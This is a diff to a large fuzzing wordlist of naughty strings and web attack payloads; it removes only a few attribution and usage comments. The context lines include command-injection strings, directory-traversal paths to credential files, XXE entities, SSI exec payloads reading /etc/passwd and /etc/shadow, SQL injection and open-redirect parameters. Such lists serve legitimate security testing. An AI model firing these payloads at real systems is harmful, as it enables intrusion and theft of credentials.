@@ -2826,7 +2826,6 @@ $(`whoami`)
 %82
 %83
 %84
-# 847 attack vectors, 8 levels of recursion (Unix-like, Windows)
 %85
 %86
 %87
@@ -4573,13 +4572,11 @@ DCC SEND STARTKEYLOGGER 0 0 0
 %DD
 %de
 %DE
-# Derived from the awesome "Directory Traversal Fuzzing Code" v0.2 by Luca Carettoni
 ../../../../../../../dev
 /dev/null; touch /tmp/blns.fail ; echo
 %df
 %DF
 Dick Van Dyke
-# Did some cleanup & removed anything to the right of boot.ini for inclusion in a
 D:/inetpub/wwwroot/global.asa
 D:\inetpub\wwwroot\global.asa
 & dir
@@ -4603,7 +4600,6 @@ dir C:\Documents and Settings\*
 ; dir C:\Users
 | dir C:\Users
 dir C:\Users
-# Directory Traversal Fuzzing Code
 dns
 <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
@@ -6075,7 +6071,6 @@ ls -l /var/www/*
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-# Luca "ikki" Carettoni - v0.1
 m
 M
 magna cum laude
@@ -6473,7 +6468,6 @@ S
 Scunthorpe General Hospital
 ,(select * from (select(sleep(10)))a)
 {{self}}
-# separate fuzzfile for more flexibiity 
 /.sh_history
 shitake mushrooms
 /.shosts
@@ -6920,7 +6914,6 @@ undefined
 /?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com
 /?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com
 /?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com
-# Usage: replace boot.ini with the absolute URI of a local resource, then use 
 user/.htpasswd
 ../users.db.php
 users.db.php
@@ -7564,7 +7557,6 @@ Y
 ý
 Ý
 ÿ
-# your favourite web application fuzzer (e.g. wfuzz)
 &yuml;
 z
 Z
